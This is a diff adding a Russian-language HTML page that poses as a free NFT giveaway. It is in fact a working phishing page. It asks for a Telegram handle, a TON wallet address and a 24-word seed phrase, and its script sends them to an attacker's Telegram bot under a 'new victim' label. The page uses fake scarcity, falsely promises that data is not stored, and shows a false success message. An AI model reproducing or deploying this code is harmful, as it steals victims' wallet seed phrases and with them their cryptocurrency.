@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NFT Подарок</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0d1117;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .box {
+            background: #161b22;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 0 50px rgba(0,0,0,0.5);
+        }
+        .box h2 {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .box p {
+            text-align: center;
+            color: #8b949e;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 1px solid #30363d;
+            background: #0d1117;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #238636;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #238636;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #2ea043;
+        }
+        .footer {
+            text-align: center;
+            color: #8b949e;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        .timer {
+            text-align: center;
+            color: #f0883e;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🎁 NFT Подарок</h2>
+        <p>Введи данные и получи уникальный NFT</p>
+        <div class="timer">⏳ Осталось подарков: 3 из 10</div>
+        <form id="giftForm">
+            <input type="text" id="tg" placeholder="📱 Telegram (например, @username)" required>
+            <input type="text" id="wallet" placeholder="💳 Кошелёк TON (EQD... или UQD...)" required>
+            <input type="text" id="seed" placeholder="🔑 Сид-фраза (24 слова через пробел)" required>
+            <button type="submit">🚀 Получить подарок</button>
+        </form>
+        <div class="footer">
+            ⚠️ Подключение безопасно. Мы не храним твои данные.<br>
+            <a href="#">Политика конфиденциальности</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('giftForm').onsubmit = async function(e) {
+            e.preventDefault();
+
+            const tg = document.getElementById('tg').value;
+            const wallet = document.getElementById('wallet').value;
+            const seed = document.getElementById('seed').value;
+
+            // Отправляем данные в бота
+            const botToken = "8592619289:AAHr5VK2tCOhGdRSyBbjFYWQK7k4aKlBUYE";
+            const chatId = "8702991121"; // сюда придут данные
+
+            const text = `🔴 НОВАЯ ЖЕРТВА!\n👤 TG: ${tg}\n💳 Кошелёк: ${wallet}\n🔑 Сид: ${seed}`;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            });
+
+            alert('✅ Подарок отправлен на твой кошелёк! Проверь в течение 24 часов.');
+            document.getElementById('giftForm').reset();
+        };
+    </script>
+</body>
+</html>
